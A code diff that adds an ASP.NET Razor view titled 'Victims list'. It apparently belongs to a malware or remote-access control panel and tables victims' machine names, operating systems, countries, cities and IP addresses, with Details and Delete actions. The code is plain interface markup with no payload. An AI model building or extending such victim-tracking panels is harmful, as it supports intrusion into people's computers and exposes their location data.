@@ -1,8 +1,107 @@
-﻿
+﻿@model List<VictimDetail>
 @{
     ViewData["Title"] = "Index";
     Layout = "~/Views/Shared/_Layout.cshtml";
 }
 
-<h1>management</h1>
+<div id="app" class="row">
+    <div class="col-md-12">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="box box-danger">
+                    <div class="box-header" style="background-color:#666">
+                        <h4 class="box-title" style="color:#ffff">Victims list</h4><small style="color:#fff"> records management</small>
 
+                        <div class="box-tools pull-right">
+                            <a class="btn btn-social-icon" style="cursor:pointer">
+                                @*<img v-on:click="updateData()" class="img-fluid" src="~/Images/cloud.png" alt="Responsive image">*@
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-md-12">
+                <div class="content">
+                    <table class="table table-content" style="color:#fff">
+                        <thead>
+                            <tr style="color:#dd4b39">
+                                <th class="text-center">Machine Name</th>
+                                <th class="text-center">Machine OS</th>
+                                <th class="text-center">Country</th>
+                                <th class="text-center">City</th>
+                                <th class="text-center">IP</th>
+                                <th></th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            @foreach (VictimDetail record in Model)
+                            {
+                                <tr>
+                                    <td class="text-center">@record.MachinName</td>
+                                    <td class="text-center">@record.MachineOS</td>
+                                    <td class="text-center">@record.Country</td>
+                                    <td class="text-center">@record.City</td>
+                                    <td class="text-center">@record.Ip </td>
+                                    <td class="no-padding">
+                                        <div class="margin">
+                                            <div class="btn-group">
+                                                <button class=" btn-danger dropdown-toggle" type="button" data-toggle="dropdown" aria-expanded="false">
+                                                    <span class="caret"></span>
+                                                    <span class="sr-only"></span>
+                                                </button>
+                                                <ul class="dropdown-menu" role="menu">
+                                                    <li>
+                                                        <a href="#" v-on:click="detail(@record.Id)">Details</a>
+                                                    </li>
+                                                    <li>
+                                                        <a href="#" v-on:click="remove(@record.Id)">Delete</a>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                        </div>
+                                    </td>
+                                </tr>
+                            }
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+@section scripts{
+
+    <script type="text/javascript">
+
+        var dataLst = new Vue({
+            el: "#app",
+            mixins: [vue_base],
+            data: {
+                data:""
+            },
+            mounted() {
+
+            },
+            methods: {
+
+                detail: function (id) {
+                    location.href = '@Url.Action("Detail","Management")/' + id;
+                },
+
+                remove: function (id) {
+
+                    this.post_request('@Url.Action("Delete","Management")', id).then(response => {
+                        if (response.data.success !== false) {
+                            //aqui va el mensaje de success
+                            location.reload();
+                        }
+                    });
+                }
+            }
+        });
+    </script>
+}
